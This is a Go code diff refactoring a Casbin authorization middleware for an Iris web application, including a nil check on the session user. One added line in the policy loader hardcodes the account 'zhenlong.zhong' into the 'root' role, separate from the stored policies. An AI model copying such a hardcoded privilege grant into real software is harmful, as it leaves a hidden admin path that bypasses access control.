@@ -4,20 +4,18 @@ import (
 	"github.com/casbin/casbin"
 	"github.com/casbin/casbin/model"
 	"github.com/jinzhu/gorm"
-	"github.com/kataras/iris"
 	"github.com/kataras/iris/context"
 	"github.com/kataras/iris/sessions"
+	"github.com/lanux/goodjob/v1/common/consts"
 	"github.com/lanux/goodjob/v1/db"
 	"github.com/lanux/goodjob/v1/web/middleware/cas"
 	"net/http"
 )
 
-func InitCasbin(app *iris.Application, ssessions *sessions.Sessions) {
+func New(ssessions *sessions.Sessions) *Casbin {
 	enforcer := casbin.NewEnforcer("./config/casbinmodel.conf", &Adapter{db.Instance()})
 	enforcer.EnableLog(true)
-	casbinMiddleware := &Casbin{enforcer: enforcer, s: ssessions}
-	app.Use(casbinMiddleware.ServeHTTP)
-	//app.WrapRouter(casbinMiddleware.Wrapper())
+	return &Casbin{enforcer: enforcer, s: ssessions}
 }
 
 type Casbin struct {
@@ -34,20 +32,13 @@ func (c *Casbin) ServeHTTP(ctx context.Context) {
 	ctx.Next()
 }
 
-//func (c *Casbin) Wrapper() router.WrapperFunc {
-//	return func(w http.ResponseWriter, r *http.Request, router http.HandlerFunc) {
-//		if !c.Check() {
-//			w.WriteHeader(http.StatusForbidden)
-//			w.Write([]byte("403 Forbidden"))
-//			return
-//		}
-//		router(w, r)
-//	}
-//}
-
 func (c *Casbin) Check(ctx context.Context) bool {
 	session := c.s.Start(ctx)
-	user := session.Get("user").(cas.AuthSuccessStruct)
+	userInfo := session.Get(consts.USER_SESSION_KEY)
+	if userInfo == nil {
+		return false
+	}
+	user := userInfo.(cas.AuthSuccessStruct)
 	method := ctx.Method()
 	path := ctx.RequestPath(false)
 	return c.enforcer.Enforce(user.Attributes.ACCOUNT, path, method)
@@ -77,6 +68,7 @@ func (ad *Adapter) LoadPolicy(model model.Model) error {
 	for _, rule := range rules {
 		model[sec][rule.PolicyType].Policy = append(model[sec][rule.PolicyType].Policy, []string{rule.Subject, rule.Object, rule.Action})
 	}
+	model["g"]["g"].Policy = append(model["g"]["g"].Policy, []string{"zhenlong.zhong", "root"})
 	return nil
 }
 
